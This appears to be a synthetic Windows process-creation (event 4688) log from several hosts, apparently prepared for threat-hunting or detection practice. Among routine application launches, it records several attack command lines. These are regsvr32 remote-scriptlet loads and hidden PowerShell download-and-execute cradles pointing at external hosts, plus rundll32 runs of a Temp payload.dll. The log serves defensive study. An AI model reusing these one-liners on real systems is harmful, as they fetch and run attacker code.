2026-06-15 00:10:00 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 00:11:05 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 00:13:24 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 00:15:05 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 00:18:54 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 00:20:07 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\explorer.exe Command Line: "explorer.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 00:20:32 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 00:22:41 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 00:26:40 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 00:28:42 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 00:31:20 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 00:35:16 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 00:35:58 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 00:40:03 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 00:44:09 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 00:44:25 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\regsvr32.exe Command Line: regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll Creator Process Name: C:\Windows\System32\cmd.exe Account Name: amehta
2026-06-15 00:45:26 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\rundll32.exe Command Line: rundll32.exe C:\Users\kpatel\AppData\Local\Temp\payload.dll,DllMain Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 00:49:05 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 00:50:33 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 00:53:08 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 00:53:26 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\rundll32.exe Command Line: rundll32.exe C:\Users\amehta\AppData\Local\Temp\payload.dll,DllMain Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 00:56:33 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 00:59:53 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 01:03:11 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 01:05:46 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 01:07:34 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 01:11:09 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 01:12:54 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 01:15:08 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 01:19:04 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 01:21:27 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 01:21:50 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\explorer.exe Command Line: "explorer.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 01:22:08 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 01:23:06 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 01:26:07 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 01:27:27 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 01:30:33 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 01:34:30 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 01:36:00 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 01:37:04 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 01:40:43 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\regsvr32.exe Command Line: regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll Creator Process Name: C:\Windows\System32\cmd.exe Account Name: amehta
2026-06-15 01:44:14 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 01:45:03 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\regsvr32.exe Command Line: regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll Creator Process Name: C:\Windows\System32\cmd.exe Account Name: rgupta
2026-06-15 01:46:12 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 01:50:11 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 01:52:07 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 01:53:09 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 01:54:05 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 01:57:51 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\rundll32.exe Command Line: rundll32.exe C:\Users\rgupta\AppData\Local\Temp\payload.dll,DllMain Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 01:58:37 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 02:00:32 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\explorer.exe Command Line: "explorer.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 02:03:16 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 02:03:40 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 02:07:17 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 02:09:10 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 02:11:59 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 02:15:05 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\regsvr32.exe Command Line: regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll Creator Process Name: C:\Windows\System32\cmd.exe Account Name: jsmith
2026-06-15 02:18:35 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 02:20:27 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 02:23:03 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 02:24:48 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 02:28:39 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line: powershell.exe -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/s.ps1') Creator Process Name: C:\Windows\System32\cmd.exe Account Name: tverma
2026-06-15 02:30:50 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 02:32:11 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 02:34:07 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 02:37:12 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 02:39:27 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 02:39:47 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line: powershell.exe -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/s.ps1') Creator Process Name: C:\Windows\System32\cmd.exe Account Name: svc_sql
2026-06-15 02:41:41 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 02:45:21 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 02:47:29 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 02:50:38 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 02:53:47 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 02:55:33 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\notepad.exe Command Line: "notepad.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 02:56:04 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 02:58:10 SRV-FILE02 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\rundll32.exe Command Line: rundll32.exe C:\Users\rgupta\AppData\Local\Temp\payload.dll,DllMain Creator Process Name: C:\Windows\explorer.exe Account Name: rgupta
2026-06-15 03:01:03 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\rundll32.exe Command Line: rundll32.exe C:\Users\amehta\AppData\Local\Temp\payload.dll,DllMain Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 03:04:14 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\regsvr32.exe Command Line: regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll Creator Process Name: C:\Windows\System32\cmd.exe Account Name: svc_sql
2026-06-15 03:04:59 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\explorer.exe Command Line: "explorer.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 03:06:16 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 03:08:58 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 03:12:50 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 03:16:59 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 03:18:47 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 03:22:00 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: dwilson
2026-06-15 03:25:26 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 03:29:25 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: nreddy
2026-06-15 03:30:16 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 03:30:53 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: tverma
2026-06-15 03:32:30 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 03:32:59 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_sql
2026-06-15 03:36:22 WKS-FIN07 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\Teams.exe Command Line: "Teams.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 03:37:06 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: amehta
2026-06-15 03:40:55 SRV-APP05 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\OUTLOOK.EXE Command Line: "OUTLOOK.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 03:42:54 WKS-SALES22 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\chrome.exe Command Line: "chrome.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 03:46:58 WKS-ENG14 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\explorer.exe Command Line: "explorer.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: jsmith
2026-06-15 03:48:29 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Windows\System32\cmd.exe Command Line: cmd.exe /c ipconfig /all Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
2026-06-15 03:52:14 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: svc_backup
2026-06-15 03:53:06 WKS-HR03 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\WINWORD.EXE Command Line: "WINWORD.EXE" Creator Process Name: C:\Windows\explorer.exe Account Name: kpatel
2026-06-15 03:55:00 SRV-DC01 Microsoft-Windows-Security-Auditing 4688 New Process Name: C:\Program Files\cmd.exe Command Line: "cmd.exe" Creator Process Name: C:\Windows\explorer.exe Account Name: lchen
